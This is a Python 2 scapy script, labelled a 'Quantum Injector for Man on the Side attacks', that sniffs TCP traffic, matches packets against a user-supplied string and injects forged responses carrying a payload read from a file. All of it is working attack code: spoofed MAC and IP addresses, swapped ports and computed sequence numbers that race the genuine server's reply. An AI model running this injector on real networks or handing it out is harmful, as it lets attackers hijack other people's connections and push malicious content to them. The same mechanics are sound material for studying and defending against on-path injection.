import netifaces
import argparse
import scapy.all as scapy
from copy import deepcopy
import random
import sys
from scapy.layers.inet import TCP, Ether, IP
import signal

#Takes arguments from the command and allocates them to interface, regular explression, datafile, and expression
parser = argparse.ArgumentParser(description='Quantum Injector for Man on the Side attacks')
parser.add_argument('-i', '--interface')
parser.add_argument('-r', '--regexp')
parser.add_argument('-d', '--datafile')
parser.add_argument('expression')
args, leftover = parser.parse_known_args()

#Filters TCP packets only
def detect_layer(packet):
    return packet.haslayer(TCP)

#Handles the user pressing ^C since the program loops forever
def signal_handler(sig, frame):
    print('\nYou want to exit!\nStopping Sniffing...')
    sys.exit(0)

#Matches the payload of the packet to the provided regular expression
def match_packet(packet):
    
    #If a regular expression was provided
    if args.regexp != None:
        if args.regexp in str(packet[TCP].payload):
            print('\nA Match Has Been Found!')
            return True
    else:
        print('\nPacket Sniffed, But No Regular Expression Provided.')
        
    return False

#Creates the fake packet that will be injected into the system
def forge_packet(packet):
        
    #Copies the real packet onto the fake packet
    fake_packet = deepcopy(packet)
    
    #Creates the ethernet header
    fake_packet[Ether].src = packet[Ether].dst
    fake_packet[Ether].dst = packet[Ether].src
    
    #Gives the fake packet a random ID           
    fake_packet[IP].id = random.randint(1000,100000)
    
    #Swaps the source and destination IP addresses since this is a response to a sent request
    fake_packet[IP].src = packet[IP].dst
    fake_packet[IP].dst = packet[IP].src
               
    #Swaps the source and destination TCP ports since this a response to a sent request           
    fake_packet[TCP].sport = packet[TCP].dport
    fake_packet[TCP].dport = packet[TCP].sport
               
    #Makes the seq number that of the real packet's ack number, 
    #and makes the new ack number the real packet's seq number plus the length of the packet          
    fake_packet[TCP].seq = packet[TCP].ack
    fake_packet[TCP].ack = packet[TCP].seq + packet.len
    
    #If a data file has been provided as a source for the fake payload           
    if args.datafile != None:       
        f = open(args.datafile, "r")
        contents = f.read()
        print "Payload:\n" + str(scapy.Raw(contents))
        fake_packet[TCP].payload = scapy.Raw(str(contents))
        
    #If no data file was provided, a default fake payload is used    
    else:
        print scapy.Raw("No payload provided, this is a fake packet!")
        fake_packet[TCP].payload = scapy.Raw("No payload provided, this is a fake packet!")
    
    #The length and checksums of the fake packet are deleted so that they may be recalculated after the changes
    del(fake_packet[IP].len)
    del(fake_packet[IP].chksum)
    del(fake_packet[TCP].chksum) 
    
    #Fragmentation is disabled for the fake packet so that the payload arrives in one packet
    fake_packet[IP].frag = 0
    
    print 'Injected a fake packet with the ID %d as a fake response to the packet with the ID %d'%(fake_packet[IP].id, packet[IP].id)
    return fake_packet


#Matches the packet with the regular expression, creates a fake packet if there is a match, and sends it 
def inject_packet(packet):

    if match_packet(packet) and packet[IP].id != 0:

        print('\nForging packet with fake payload...')
        
        try:
            return scapy.sendp(forge_packet(packet), verbose=True)
        except:
            print('Could not forge a packet, sorry.')


def main():
    #Handles keyboard interrupts
    signal.signal(signal.SIGINT, signal_handler)

    #Sets the default interface if no interface is provided
    if args.interface is None:
        print 'No interface provided, using default!\n'
        args.interface = netifaces.gateways()['default'][netifaces.AF_INET][1]

    #Sniffs for TPC packets matching the expression and interface provided and calls inject_packet when there's a match
    while(True):
        scapy.sniff(iface=args.interface, filter=args.expression, count=10, prn=inject_packet, lfilter=detect_layer)

if __name__ == "__main__":
    main()
